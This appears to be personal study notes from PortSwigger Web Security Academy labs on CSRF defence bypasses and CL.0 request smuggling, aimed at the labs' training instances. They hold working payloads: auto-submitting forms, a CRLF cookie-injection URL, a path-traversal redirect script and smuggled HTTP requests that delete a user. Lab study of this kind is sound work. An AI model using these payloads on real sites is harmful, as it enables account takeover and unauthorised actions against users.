Requirement for csrf

	• Relevant action
	• Cookie based session handling
	• No unpredictable request parameters 

Can be automated using  burpesuite pro edition 



```
<form method="POST" action="https://0a39003e04cac15b80985df6004b00b0.web-security-academy.net/my-account/change-email">
	 <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> 
<script> 
	document.forms[0].submit();
 </script>
```

From <https://portswigger.net/web-security/csrf/lab-no-defenses> 


```
<form method="POST" action="https://0a39003e04cac15b80985df6004b00b0.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="viet@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```
**CSRF where token validation depends on request method**




Intercept we notice a csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c04ead97-a67a-46ac-9cec-52adef46971d)


Remove csrf token we get a response that we need to change it
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6c89d56c-5b43-4c9b-a612-d9268239279b)



Changine request to get and removing email change we can send it and get a 302 response
"Follow redirection" we notice that we changed the email without a csrf token
```
<form action="https://0a05007c04bf708c81e28a7200120078.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="viet2@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>
```

**CSRF where token validation depends on token being present**

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1b0c0949-c707-4f48-ab19-527524cf985e)


Deleting csrf parameter result in the 302 response 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/771e5618-9d4d-4112-af7c-a90bee8ca4e2)


Exploit: 
```
<form method="POST" action="https://0aa1003d040b2b3f81817a48001f00f2.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="vi@gmail.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

**CSRF where token is not tied to user session**

Cant changed email when removing csrf token
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7f8f8bc7-fb21-49e1-98a5-c9e787f3e597)

Cant change to get request either to change email
See if csrf token is tied to user session
Check by logging into another user account and copying there csrf token 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b26f4b63-6f22-490f-aee2-e96c485aae5c)

 



Replacing the csrf parmeter we get a 302 response 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/16b7e052-d04d-40c3-a6b2-b7a3357a4789)



CSRF token is used every time we changed an account so if we want to change another one we need another csrf token 
Our exploit:
```
<html>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0a08004803a6fb1a8040b860005c004f.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="hidden" name="csrf"  value="aIOCt2aXj52tiS7BFW5EVCy8k7UG8siS" />
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```

**CSRF where token is tied to non-session cookie**

We got a csrfkey
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/0db13860-e234-45b5-a8cc-7198ecc73da2)


Looks like csrf key is tied to session key 

Testing csrf token and csrf key 
```
1. Check if csrf token is tied to the csrf cookie 
2. Submit a valid csrf token from another user
```
	
Test case 1 fail
Changing csrf parameter doesn't give 302 response

Test case 2 fail
Using another user csrf 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/310db429-3ca8-4448-a95d-093e30d6ee56)


Checking other cookie parameter

Cookie: Status 302
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ac9e04c0-338c-41d5-b335-b420fae55b48)

```
session=0HKiqjYhk7G0eFu5p388lxZHhaQKP0ny; 
csrfKey=fbdsO5lxQm8jH4t5GvzCOG0nnDVlfcPC
```
	
	
Exploit:
Case 2 is met 
To exploit
```
1.  inject a csrfKey cookie in the user session (http header injection)
2. Send a csrf attack to the victim with a known csrf token 

?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY
Get a 302 when we set the key from intercepting search
``` 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3e0a38e5-9333-444e-a6bd-a4d89399af54)


Exploit:

```
<html>
    <body>
    <script> history.pushState('','', '/')</script>
    <form action="https://0ab6004a037bf6198423a1cb00b4004d.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="v@gmail.com"/>
        <input type="hidden" name="csrf"  value="aIOCt2aXj52tiS7BFW5EVCy8k7UG8siS" />
        <input type="submit" value="submit request"/>
    </form>
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```

**CSRF where Referer validation depends on header being present**
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7500b508-bbda-4d08-a4cf-e47133e131e9)



Meet 3 requirement for csrf attack

A relevant action: change email
Cookie-based session handling: session cookie
No unpredictable request parameter: no csrf token in parameter 

If we host a typical csrf form 
```
<html>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0af6002b044ec32084de63e900bb0053.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d2676c46-8bff-4fc1-8d25-3506009a30b2)


We will get 
"invalid refer header"
There checking the refer header to make sure there no crossdomain request 
Refer header is a optional request header that contain the url of the page that is making the request 
Defend against csrf attack to make sure that the request came from the same domain as the website 
If it came with anything else it will be ban

Refer header is shown on our request 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/41c3f723-4762-49e9-93c4-1f424f379ada)


Not a good defense cause the referer header can be spoof

Testing referer header for csrf attacks:
```
1. Remove the referer header
	Got a 302 response
```
We need to make sure our form don’t accept referer header
Use the meta tag 
Will not include refer tag
```
<html>
    <head>
        <meta name="referrer" content="never">   
    </head>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0af6002b044ec32084de63e900bb0053.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```
**CSRF with broken Referer validation**
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/eb677696-825d-43e5-b655-7a311ce020c3)







```
<html>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0af6002b044ec32084de63e900bb0053.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6216ab1e-e691-4acd-877e-3ec41415ea40)



Deleting refer header give us a 400 bad request
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/68876865-5dc5-4983-af52-f71c09dadf27)


Testing refer header
```
1. Removing the refer header: give us a invalid referer header 
2. Check which portion of the referrer header is the application validating
``` 
	
	
Check by changing domain that you control
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a3d40376-4f04-4d31-bfb7-21d00c0e0e90)


Condition 2 met
Used history.pushState third parameter

Changed: Added so that the third parameter in our history.pushState wont be stripped
Referrer-Policy: unsafe-url 

POC

```
<html>
    <body>
    <script> history.pushState(' ',' ', '/?0a6b009e043ef2ae81f55cc90042008a.web-security-academy.net')</script>
    <form action="https://0a6b009e043ef2ae81f55cc90042008a.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```
**Bypassing samsite lax restriction**


Chrome applies Lax samesite restriction by default


From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 



If you encounter a cookie set with SameSite=None or with no explicit restrictions, it's worth investigating whether it's of any use. 

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 

When setting a cookie with SameSite=None, the website must also include the Secure attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set. 

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 

Simpliest approach for samsite restriction bypass 
```
<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; </script>
```

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 


Skeleton script

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 

Exploit

```
<html>
    <body>
    <script> history.pushState(' ',' ', '/')</script>
    <form action="https://0a8400150459db7c814e7548006d00f5.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="_method" value="POST"/>
        <input type="hidden" name="email" value="vffasf@gmail.com"/>
        <input type="submit" value="submit request"/>
    </form>
    <script>
        document.forms[0].submit();
    </script>
    </body>
</html>
```

Explanation


If they also use Lax restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a GET request from the victim's browser. 
Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes: 

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 



From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 

**SameSite Strict bypass via client-side redirect**


If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 


If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely. 

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 

When login 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/29d81d35-7e9a-4577-ac67-f6db54ed928b)





We get a redirection page when posting a arbitrary comment
This correlate to the following js 
• Study the JavaScript and notice that this uses the postId query parameter to dynamically construct the path for the client-side redirect. 

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/92921d4d-9048-4301-92e5-9c8828f55bfd)





Visit our redirect 
`https://0a6200fa04cb44c486744f8900860063.web-security-academy.net/post/comment/confirmation?postId=foo`
JavaScript attempts to redirect you to a path containing your injected string, for example, /post/foo
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/82591acf-89af-4005-a441-84d145fe56c8)

From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect> 

Directory traversal 
• Observe that the browser normalizes this URL and successfully takes you to your account page. This confirms that you can use the postId parameter to elicit a GET request for an arbitrary endpoint on the target site. 
• This mean we can control our postID parameter 
From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect> 


```
https://0a6200fa04cb44c486744f8900860063.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a9111324-1e12-4004-b90f-f6ffabb8d0c4)



Our payload
```
<script>
    document.location = "https://0a6200fa04cb44c486744f8900860063.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

 **SameSite Lax bypass via cookie refresh**

Will bypass sso by opening up a popup window for our victim to change email
```
<form method="POST" action="https://0aea00c4046e2250803b4468000e001f.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://0aea00c4046e2250803b4468000e001f.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

**CL.0 request smuggling** 

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a7bfaaa2-c936-43ac-bebe-40f0f4f8b7c0)



Add these two to a group on repeater





Add the following to group 1.2

```
POST / HTTP/2
Host: 0a0c008e037599ba807612a4006d00b1.web-security-academy.net
Cookie: session=34g6IyUAUQpkwNdGkko1Z8A93ZKOVzcg
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

change the send mode to Send group in sequence (single connection). 

From <https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling> 

Send the sequence and check the responses. 

From <https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling> 

Deduce that you can use requests for static files under /resources, such as /resources/images/blog.svg, to cause a CL.0 desync. 

From <https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling> 

```
POST /resources/images/blog.svg HTTP/2
Host: 0a0c008e037599ba807612a4006d00b1.web-security-academy.net
Cookie: session=34g6IyUAUQpkwNdGkko1Z8A93ZKOVzcg
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/efbd6f36-8e92-41d5-ac5a-3c134ad3158d)



Delete user with 
```
POST /resources/images/blog.svg HTTP/2
Host: 0a0c008e037599ba807612a4006d00b1.web-security-academy.net
Cookie: session=34g6IyUAUQpkwNdGkko1Z8A93ZKOVzcg
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/51697451-e141-43f1-ac6d-57bcc103675c)


























